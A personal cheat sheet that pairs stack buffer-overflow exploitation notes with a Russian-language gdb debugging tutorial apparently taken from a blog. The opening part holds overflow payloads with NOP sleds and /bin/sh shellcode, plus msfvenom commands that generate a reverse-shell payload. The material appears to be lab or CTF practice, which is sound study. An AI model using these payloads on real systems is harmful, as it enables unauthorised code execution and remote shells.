$ gdb-peda [ELF-файл]  
$ gdb-gef [ELF-файл]  
$ gdb-pwndbg [ELF-файл]  
######################################  
gdb-peda$ show follow-fork-mode  
gdb-peda$ show detach-on-fork   
gdb-peda$ set detach-on-fork off  
gdb-peda$ info inferior  
gdb-peda$ inferior 1  
gdb-peda$ list  
gdb-peda$ break 22  
gdb-peda$ info proc map #информация о приложении и стеке  
gdb-peda$ x/50x 0xffeb5c00  
gdb-peda$ pattern create 50  
gdb-peda$ pattern offset AA;A  
######################################  
run $(python -c "print '\x55' * 1036 + '\x66' * 4")  
  
run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')  
  
gdb-peda$ r `python -c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::-1]'`  
  
gdb-peda$ r `python -c 'print "\x90"*32 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x90"*32 + "A"*35 + "\xbf\xff\xed\xe8"[::-1]'  
######################################  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c  
^simple shellcode  
x/2000xb $esp+550  
^shows all content with 0x00 where is bad character  
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode  
^confirmed shellcode without bad characterrs  
######################################  
Для комфортной отладки сначала нужно собрать программу с правильными флагами. Во-первых, необходимо указать флаг -g. Иначе программа будет собрана без отладочных символов и отлаживать ее придется в ассемблерном коде (что, впрочем, вполне выполнимо для программ, написанных на чистом Си). Во-вторых, рекомендуется отключить оптимизации при помощи флага -O0, иначе некоторые переменные окажутся, что называется, optimized out, и вы не сможете посмотреть их значения при отладке.  
  
Другими словами, при прочих равных программу лучше собирать как-то так:  
  
gcc -O0 -g test.c -o test  
Запускаем программу в отладчике:  
  
gdb ./test  
При необходимости передать программе какие-то аргументы можно так:  
  
gdb --args ./test --ololo --trololo  
Запуск с так называемом Text User Interface, интерфейсом на основе curses (мне лично он не нравится):  
  
gdb -tui ./test  
Еще можно прицепиться к уже работающему процессу по его id:  
  
gdb -p 12345  
Для анализа корок используем команду вроде такой:  
  
gdb /path/to/prog /tmp/core_prog.1234  
Чтобы корки вообще писались, систему нужно правильно настроить:  
  
ulimit -c unlimited  
sudo sysctl -w kernel.core_pattern='/tmp/core_%e.%p'  
Плюс в /etc/security/limits.conf пишем что-то вроде:  
  
# где eax - имя вашего пользователя в системе  
eax    soft core    50000  
eax    hard core    500000  
… а в /etc/sysctl.conf:  
  
kernel.core_pattern = /tmp/core_%e.%p  
Кстати, корки можно создавать «вручную» прямо из gdb при помощи команды:  
  
generate-core-file  
Для удаленной отладки на сервере выполняем команды:  
  
sudo apt-get install gdbserver  
gdbserver :3003 myprog  
На клиенте говорим откуда брать отладочные символы:  
  
gdb -q myprog  
… и цепляемся:  
  
target remote 10.110.0.10:3003  
Заметьте, что в Ubuntu при попытке прицепиться к своим процессам без sudo вы можете получить ошибку вроде такой:  
  
Could not attach to process.  If your uid matches the uid of the target  
process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or  
try again as the root user.  
  
For more details, see /etc/sysctl.d/10-ptrace.conf  
  
ptrace: Operation not permitted.  
Для решения этой проблемы говорим:  
  
sudo sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'  
… а также правим /etc/sysctl.d/10-ptrace.conf:  
  
kernel.yama.ptrace_scope = 0  
Итак, тем или иным образом мы прицепились отладчиком куда надо. Теперь нам доступны следующие команды.  
  
Хэлп:  
  
h  
Для выполнения команды в gdb можно вводить либо всю команду целиком, либо только первые несколько букв. То есть, h, he и help или r, ru и run — это все одни и те же команды. Здесь я преимущественно буду использовать короткие версии, так как это то, что вы скорее всего будете использовать на практике. К тому же, соответствующие длинные версии обычно очевидны.  
  
Fun fact! Нравится статья? Поддержи автора, чтобы он мог писать больше полезных статей!  
  
Начать выполнение программы, если она еще не выполняется:  
  
r  
Продолжить выполнение программы:  
  
c  
Прервать выполнение в любой момент можно нажатием Ctr+C.  
  
Отцепиться от программы, оставшись при этом в отладчике:  
  
detach  
Выйти из отладчика (если цеплялись через -p, процесс продолжит работу):  
  
q  
Просмотр исходного кода программы:  
  
l  
l номер_строки  
l откуда,докуда  
Если вы отлаживаете программу не на том же сервере, на котором программа была собрана, на него нужно залить исходиники по тому же пути, что использовался на билд сервере, иначе листинг не будет работать.  
  
Когда исходников под рукой нет, можно посмотреть ассемблерный код:  
  
disassemble  
Step — шаг вперед или несколько шагов вперед:  
  
s  
s 3  
Next — как step, только без захода внутрь других методов и процедур:  
  
n  
n 3  
Until — выполнить программу до указанной строчки:  
  
u 100  
Продолжить выполнение до возвращения из текущей процедуры:  
  
fin  
Показать стэктрейс:  
  
backtrace  
bt  
Перемещение между фреймами стака:  
  
f 0  
f 1  
Информация о текущем фрейме:  
  
info frame  
Показать аргументы в текущем фрейме:  
  
info args  
Показать локальные переменные в текущем фрейме:  
  
info locals  
Ставим бряк:  
  
b mysourcefile.c:123  
b my_procedure_name  
Список бряков:  
  
info b  
Удаление бряка по номеру:  
  
d 1  
Удаление всех бряков:  
  
d  
Временное включение и выключение бряков:  
  
enable 1  
disable 1  
Проигнорировать столько-то итераций:  
  
ignore 1 15  
Условные брейкпоинты ставятся как-то так:  
  
b место if variable == 1  
Еще вы можете установить брейкпоинт прямо в исходном коде вашей программы:  
  
  /* ... */  
  do_something();  
  /* одинаковый синтаксис для GCC и CLang */  
  __asm__ __volatile__("int3");  
  do_something_else();  
  /* ... */  
Список нитей:  
  
info threads  
Переключение на нитку:  
  
thread 1  
Вывести значение переменной:  
  
p myvar  
Также можно кастовать типы:  
  
p (int)myvar  
Обращаться к полям:  
  
p mystruct.field  
p *mystryct.otherfield  
Вообще можно использовать gdb как калькулятор:  
  
p (10.0+20+30)/sizeof(int)  
Можно менять значения переменных в программе:  
  
p someVar=123  
Есть ограниченная поддержка переменных:  
  
set $i = (int)0  
p $i  
Можно вызывать процедуры и методы:  
  
set $pi = (int*)malloc(sizeof(int))  
p $pi  
p free($pi)  
Дамп памяти (explore):  
  
x/16xb some_var  
x/32uh some_var  
x/64dw some_var  
В приведенных примерах выводится дамп (1) 16-и байт с выводом в hex, (2) 32-х полуслов, которые выводятся, как числа без знака и (3) 64-х слов, которые выводятся, как числа со знаком.  
  
Еще gdb умеет выполнять «скрипты», что позволяет, к примеру, быстро получить текущий стектрейс процесса и тут же отсоединиться, почти не останавливая его работу:  
  
gdb --batch --command=gdb.script -p 12345